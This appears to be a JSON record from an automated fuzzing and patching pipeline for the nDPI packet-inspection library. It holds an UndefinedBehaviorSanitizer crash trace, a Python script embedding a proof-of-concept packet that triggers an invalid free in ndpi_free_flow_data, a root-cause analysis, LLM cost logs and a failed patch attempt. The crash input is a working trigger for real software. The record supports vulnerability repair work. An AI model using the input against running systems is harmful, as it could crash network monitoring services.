@@ -1,0 +1,259 @@
+{
+  "vuln_id": 538,
+  "crash_result": {
+    "output": "UndefinedBehaviorSanitizer:DEADLYSIGNAL\n==9195==ERROR: UndefinedBehaviorSanitizer: SEGV on unknown address 0x0606060605fe (pc 0x74162e68b562 bp 0x7ffca0088ef0 sp 0x7ffca0088e90 T9195)\n==9195==The signal is caused by a READ memory access.\n    #0 0x74162e68b562 in free (/lib/x86_64-linux-gnu/libc.so.6+0x84562)\n    #1 0x4b321c in ndpi_free /src/ndpi/src/lib/ndpi_main.c:164:7\n    #2 0x4c033d in ndpi_free_flow_data /src/ndpi/src/lib/ndpi_main.c:4308:2\n    #3 0x4b32d4 in ndpi_free_flow /src/ndpi/src/l",
+    "stack": "#0 0x74162e68b562 in free (/lib/x86_64-linux-gnu/libc.so.6+0x84562)\n#1 0x4b321c in ndpi_free ndpi/src/lib/ndpi_main.c:164:7\n#2 0x4c033d in ndpi_free_flow_data ndpi/src/lib/ndpi_main.c:4308:2\n#3 0x4b32d4 in ndpi_free_flow ndpi/src/lib/ndpi_main.c:7054:5\n#4 0x4b3024 in LLVMFuzzerTestOneInput ndpi/fuzz/fuzz_process_packet.c:26:3\n#5 0x442841 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) llvm-project/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:599:15\n#6 0x42c5d2 in fuzzer::RunOneT",
+    "dedup": "free--ndpi_free--ndpi_free_flow_data"
+  },
+  "pov_run_data": {
+    "task_uuid": "59eef7b0-4861-5981-9dd1-34c278ef1b99",
+    "project_name": "ndpi",
+    "harness": "fuzz_process_packet",
+    "sanitizer": "address",
+    "engine": "libfuzzer",
+    "dedup": "free--ndpi_free--ndpi_free_flow_data"
+  },
+  "decoded_pov": {
+    "project_name": "ndpi",
+    "harness": "fuzz_process_packet",
+    "sanitizer": "address",
+    "engine": "libfuzzer",
+    "decoding": "<pov_script>\n\n# Use embedded PoC data\npoc_data = b\"E&\\x01 \\x01J\\x00\\x00\\x00\\x06}\\x01~\\x04\\x01\\x00\\x13\\x00\\x00\\x00\\x00X\\xd1\\x8e\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00 \\x01\\x00\\x00\\x00\\x00\\x00\\x00f_FOUN\\x00\\x06\\x03D\\r\\n\\x1b\\x1b\\x1b\\x1b\\x1b\\x1b\\x1b\\x1b\\x1b\\x1b\\x1b'\\x06\\x06\\x06\\x06\\x06\\x06\\x06\\x06\\x06\\x1b\\x1b\\x1b]\\x1b\\x1b\\x06\\x06\\x06\\x06\\x06\\x06\\x06\\x06\\x06\\r\\n\\xff\\xff\\xff\\xffNMEa\\x8c\\x1ber1I\\xf3\\xf3\\xf3CA\\x01\\x00\\x00\\x00\\x00\\x00\\x00]*\\x00\\xb70P\\xff\\x00\\x00\\x00\\x00\\x00_\\x00\\x00\\x00\\x00\\x00\\x00\\x00Ea\\x8cid;\\xff\\xff\\xff\\xff\\xffoerY\\x00\\x00\\x00\\x00\\x00\\x00\\x00ME\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00ML@SI\\xb70P\\xa3/S.2T \\xf3CANMEa\\x8cid;\\r\\n\\xff\\xff\\xff\\xffNMEa\\x8c\\x1ber1I\\xf3\\xf3\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x00\\x00\\x00]*\\x00\\xb70P\\xa3/S.ANMEa\\x8cid;\\r\\n\\xff\\xff\\xff\\xff;\\r\\n\\xff\\xff\\xff\\xff/S.2TAT \\xf3CANMEa\\x8cid;\\r\\n\\xff\\xff\\xff\\xff\"\n\nwith open(\"input.bin\", \"wb\") as f:\n    f.write(poc_data)\n\n</pov_script>\n",
+    "dedup": "free--ndpi_free--ndpi_free_flow_data"
+  },
+  "analyzed_vuln": {
+    "function": "ndpi_free_flow_data",
+    "file": "ndpi/src/lib/ndpi_main.c",
+    "description": "`ndpi_free_flow_data()` blindly frees multiple pointer fields in `ndpi_flow_struct` based on protocol-state checks, but those fields can contain attacker-controlled non-heap values due to earlier packet parsing/state corruption in the same flow object. In this PoV, `flow->protos.tls_quic_stun.tls_quic.tls_supported_versions` is non-NULL with an invalid value (0x060606...), and `ndpi_free()` calls libc `free()` on it, causing a SEGV. The root issue is missing ownership/validity guarantees before freeing flow subfields (unsafe free of untrusted/stale pointer state).",
+    "conditions": "Harness `fuzz_process_packet` allocates a zeroed flow, processes one attacker-controlled packet via `ndpi_detection_process_packet`, then always calls `ndpi_free_flow`. A crafted packet that drives TLS/QUIC-related parsing so that flow protocol checks pass in `ndpi_free_flow_data()` and leaves one of the corresponding dynamic-string pointers (notably `tls_supported_versions`) set to an invalid non-allocated address will deterministically crash during teardown when `ndpi_free_flow_data()` frees it."
+  },
+  "cost_analysis": {
+    "triage": {
+      "total_llm_calls": 2,
+      "total_cost": 0.0200655,
+      "total_input_tokens": 12442,
+      "total_output_tokens": 382,
+      "total_cached_tokens": 4480,
+      "llm_calls": [
+        {
+          "timestamp": 1775794397.929997,
+          "model": "gpt-5.3-codex",
+          "cost": 0.00546735,
+          "input_tokens": 3313,
+          "output_tokens": 106,
+          "total_tokens": 3419,
+          "cached_tokens": 1152,
+          "input_cost_per_token": 1.75e-06,
+          "output_cost_per_token": 1.4e-05,
+          "cache_cost_per_token": 1.75e-07,
+          "has_tool_calls": true,
+          "tool_call_count": 3,
+          "tool_calls": [
+            {
+              "tool_name": "read_source",
+              "tool_call_id": "call_qyRQzoyuqhMkWAcus2wwEXpE"
+            },
+            {
+              "tool_name": "read_source",
+              "tool_call_id": "call_iIB0DwGMLASGAWwdR7VBipHJ"
+            },
+            {
+              "tool_name": "read_source",
+              "tool_call_id": "call_q6v9vdR6VdoXmkkwJCcFRoke"
+            }
+          ],
+          "finish_reason": "tool_calls"
+        },
+        {
+          "timestamp": 1775794417.2867205,
+          "model": "gpt-5.3-codex",
+          "cost": 0.014598149999999999,
+          "input_tokens": 9129,
+          "output_tokens": 276,
+          "total_tokens": 9405,
+          "cached_tokens": 3328,
+          "input_cost_per_token": 1.75e-06,
+          "output_cost_per_token": 1.4e-05,
+          "cache_cost_per_token": 1.75e-07,
+          "has_tool_calls": true,
+          "tool_call_count": 1,
+          "tool_calls": [
+            {
+              "tool_name": "terminate",
+              "tool_call_id": "call_MCfbt8ubNTHEULVhdaCiADN5"
+            }
+          ],
+          "finish_reason": "tool_calls"
+        }
+      ]
+    },
+    "patching": {
+      "total_llm_calls": 4,
+      "total_cost": 0.03370115,
+      "total_input_tokens": 27333,
+      "total_output_tokens": 1309,
+      "total_cached_tokens": 20608,
+      "llm_calls": [
+        {
+          "timestamp": 1775794419.1851766,
+          "model": "gpt-5.3-codex",
+          "cost": 0.00644245,
+          "input_tokens": 4395,
+          "output_tokens": 98,
+          "total_tokens": 4493,
+          "cached_tokens": 1664,
+          "input_cost_per_token": 1.75e-06,
+          "output_cost_per_token": 1.4e-05,
+          "cache_cost_per_token": 1.75e-07,
+          "has_tool_calls": true,
+          "tool_call_count": 3,
+          "tool_calls": [
+            {
+              "tool_name": "read_source",
+              "tool_call_id": "call_LpdNWlwDTO3XpyO8yhXQyUys"
+            },
+            {
+              "tool_name": "read_source",
+              "tool_call_id": "call_dzGp21hLQWoZD36y07OnHqBj"
+            },
+            {
+              "tool_name": "find_references",
+              "tool_call_id": "call_nd0T8pjaP0e2wjH8YzDIr1kR"
+            }
+          ],
+          "finish_reason": "tool_calls"
+        },
+        {
+          "timestamp": 1775795022.8567595,
+          "model": "gpt-5.3-codex",
+          "cost": 0.00329735,
+          "input_tokens": 5537,
+          "output_tokens": 33,
+          "total_tokens": 5570,
+          "cached_tokens": 4352,
+          "input_cost_per_token": 1.75e-06,
+          "output_cost_per_token": 1.4e-05,
+          "cache_cost_per_token": 1.75e-07,
+          "has_tool_calls": true,
+          "tool_call_count": 1,
+          "tool_calls": [
+            {
+              "tool_name": "read_source",
+              "tool_call_id": "call_7k4qeUNXaxcv8nS4rvhPhX5f"
+            }
+          ],
+          "finish_reason": "tool_calls"
+        },
+        {
+          "timestamp": 1775795035.3807664,
+          "model": "gpt-5.3-codex",
+          "cost": 0.02074695,
+          "input_tokens": 8137,
+          "output_tokens": 1084,
+          "total_tokens": 9221,
+          "cached_tokens": 5504,
+          "input_cost_per_token": 1.75e-06,
+          "output_cost_per_token": 1.4e-05,
+          "cache_cost_per_token": 1.75e-07,
+          "has_tool_calls": true,
+          "tool_call_count": 1,
+          "tool_calls": [
+            {
+              "tool_name": "apply_patch",
+              "tool_call_id": "call_jI54dEhxPgCISyh49MpchI1L"
+            }
+          ],
+          "finish_reason": "tool_calls"
+        },
+        {
+          "timestamp": 1775795037.6041224,
+          "model": "gpt-5.3-codex",
+          "cost": 0.0032143999999999996,
+          "input_tokens": 9264,
+          "output_tokens": 94,
+          "total_tokens": 9358,
+          "cached_tokens": 9088,
+          "input_cost_per_token": 1.75e-06,
+          "output_cost_per_token": 1.4e-05,
+          "cache_cost_per_token": 1.75e-07,
+          "has_tool_calls": true,
+          "tool_call_count": 1,
+          "tool_calls": [
+            {
+              "tool_name": "terminate",
+              "tool_call_id": "call_l3FnJZV0RHHAhhRfPM7fNjUW"
+            }
+          ],
+          "finish_reason": "tool_calls"
+        }
+      ]
+    },
+    "total": {
+      "total_cost": 0.05376665,
+      "total_input_tokens": 39775,
+      "total_output_tokens": 1691,
+      "total_llm_calls": 6
+    }
+  },
+  "patch_result": {
+    "success": false,
+    "failure_reason": "the agent did not produce a result"
+  },
+  "context_retrieval": {
+    "source_questions": [],
+    "read_definition": [],
+    "read_source": [
+      {
+        "tool_name": "read_source",
+        "args": [
+          "src/lib/ndpi_main.c",
+          164
+        ],
+        "kwargs": {},
+        "timestamp": 485392.635633624,
+        "success": true,
+        "result_summary": "Err(CRSError(path 'src/lib/ndpi_main.c' does not exist in directory tree. Similar paths: ndpi/src/lib/ndpi_main.c, extra=None))"
+      },
+      {
+        "tool_name": "read_source",
+        "args": [
+          "src/lib/ndpi_main.c",
+          4308
+        ],
+        "kwargs": {},
+        "timestamp": 485392.63588305,
+        "success": true,
+        "result_summary": "Err(CRSError(path 'src/lib/ndpi_main.c' does not exist in directory tree. Similar paths: ndpi/src/lib/ndpi_main.c, extra=None))"
+      },
+      {
+        "tool_name": "read_source",
+        "args": [
+          "ndpi/src/lib/ndpi_main.c",
+          4308
+        ],
+        "kwargs": {},
+        "timestamp": 485734.059880044,
+        "success": true,
+        "result_summary": "Ok({'contents': '4209     return(1);\\n4210 \\n4211   if((iph = (const struct ndpi_iphdr *) l3) == NULL)\\n4212     return(1);\\n4213 \\n4214   if(iph->version == IPVERSION && iph->ihl >= 5) {\\n4215     ND..."
+      }
+    ],
+    "find_references": [
+      {
+        "tool_name": "find_references",
+        "args": [
+          "tls_supported_versions",
+          "",
+          false
+        ],
+        "kwargs": {},
+        "timestamp": 485732.756180073,
+        "success": true,
+        "result_summary": "Ok([FileReferences(file_name='ndpi/src/lib/ndpi_utils.c', refs=[FileReference(line=1257, content='      if(flow->protos.tls_quic_stun.tls_quic.tls_supported_versions)', enclosing_definition='ndpi_dpi2..."
+      }
+    ],
+    "apply_patch": [],
+    "test_patch": [],
+    "undo_last_patch": [],
+    "list_current_edits": []
+  }
+}
